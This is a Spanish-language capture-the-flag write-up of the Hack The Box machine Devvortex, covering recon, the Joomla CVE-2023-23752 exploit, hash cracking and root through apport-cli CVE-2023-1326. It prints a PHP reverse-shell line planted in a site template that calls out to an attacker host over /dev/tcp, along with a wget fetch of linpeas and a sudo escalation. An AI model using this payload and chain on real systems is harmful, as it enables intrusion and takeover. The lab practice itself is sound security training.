@@ -1,0 +1,148 @@
+TÍTULO: Hack The Box — Devvortex Write-up (Español)
+AUTOR: zSodex
+FECHA: Mar 27, 2025
+URL: https://medium.com/@zsodex/hack-the-box-devvortex-write-up-espa%C3%B1ol-a268778195de
+
+════════════════════════════════════════════════════════════
+
+Autor: zSodex
+Dificultad: Easy
+
+Técnicas clave:
+- Explotación de Joomla
+- Crackeo de hashes
+- Apport-cli para escalar privilegios
+
+────────────────────────────────────────────────────────────
+🕵️ Reconocimiento inicial
+────────────────────────────────────────────────────────────
+
+Escaneo básico de puertos con nmap:
+
+    sudo nmap -sV -sC 10.10.11.242
+
+🔍 Puertos abiertos encontrados:
+- 22/tcp — SSH (OpenSSH 8.2p1 Ubuntu)
+- 80/tcp — HTTP (nginx 1.18.0 Ubuntu)
+
+Configuración inicial:
+
+    sudo sh -c 'echo "10.10.11.242 devvortex.htb" >> /etc/hosts'
+
+────────────────────────────────────────────────────────────
+🌐 Descubrimiento de subdominios
+────────────────────────────────────────────────────────────
+
+    gobuster vhost -u devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+Encontré el subdominio: dev.devvortex.htb
+
+    # Agregué al archivo hosts:
+    10.10.11.242 dev.devvortex.htb devvortex.htb
+
+────────────────────────────────────────────────────────────
+📂 Enumeración de directorios
+────────────────────────────────────────────────────────────
+
+    dirsearch -u http://dev.devvortex.htb/
+
+────────────────────────────────────────────────────────────
+🎯 Explotación de Joomla (CVE-2023-23752)
+────────────────────────────────────────────────────────────
+
+Descubrí que el sitio usaba Joomla. Verifiqué la versión en:
+
+    http://dev.devvortex.htb/language/en-GB/langmetadata.xml
+
+Versiones anteriores a 4.2.8 son vulnerables. Usé el exploit CVE-2023-23752:
+
+    https://github.com/Acceis/exploit-CVE-2023-23752
+
+🔑 Credenciales obtenidas:
+- Usuario: lewis
+- Contraseña: Panth4r…..
+
+────────────────────────────────────────────────────────────
+🐚 Obtención de reverse shell
+────────────────────────────────────────────────────────────
+
+Accedí al panel de administración: http://dev.devvortex.htb/administrator/
+
+Modifiqué la plantilla Cassiopeia para incluir código PHP malicioso:
+
+    Sistema → Plantillas de Administrador → index.php
+
+Agregué al final del archivo:
+
+    <?php system("bash -c 'sh -i >& /dev/tcp/10.10.14.11/4444 0>&1'"); ?>
+
+Escuché en mi máquina:
+
+    nc -lvnp 4444
+
+Accedí a la plantilla para ejecutar el código:
+
+    http://dev.devvortex.htb/templates/cassiopeia/index.php
+
+✅ Conseguí acceso como www-data.
+
+────────────────────────────────────────────────────────────
+⬆️ Escalada de privilegios a usuario
+────────────────────────────────────────────────────────────
+
+Subí linpeas.sh para analizar el sistema:
+
+    # En mi máquina:
+    python3 -m http.server 8000
+
+    # En la víctima:
+    wget http://10.10.14.11:8000/linpeas.sh
+
+Encontré una base de datos. Me conecté con mysql y las credenciales ya conocidas y dumpé las tablas.
+
+Extraje hashes y los crackeé con John:
+
+    john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+Accedí por SSH como usuario logan con la contraseña obtenida:
+
+    ssh logan@devvortex.htb
+
+    cat user.txt
+
+────────────────────────────────────────────────────────────
+👑 Escalada a root (CVE-2023-1326)
+────────────────────────────────────────────────────────────
+
+Verifiqué permisos sudo:
+
+    sudo -l
+
+Encontré que podía ejecutar apport-cli como root, el cual tenía la vulnerabilidad CVE-2023-1326:
+
+    sudo apport-cli
+
+Dentro de apport-cli usé:
+
+    v          # Para abrir el editor
+    !/bin/bash # Para obtener shell como root
+
+🎉 Conseguí acceso como root:
+
+    cat /root/root.txt
+
+────────────────────────────────────────────────────────────
+📋 Resumen de comandos útiles
+────────────────────────────────────────────────────────────
+
+    sudo nmap -sV -sC 10.10.11.242
+    gobuster vhost -u devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+    dirsearch -u http://dev.devvortex.htb/
+    nc -lvnp 4444
+    python3 -m http.server 8000
+    john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+    sudo apport-cli → v → !/bin/bash
+
+════════════════════════════════════════════════════════════
+FIN DEL ARTÍCULO
+════════════════════════════════════════════════════════════
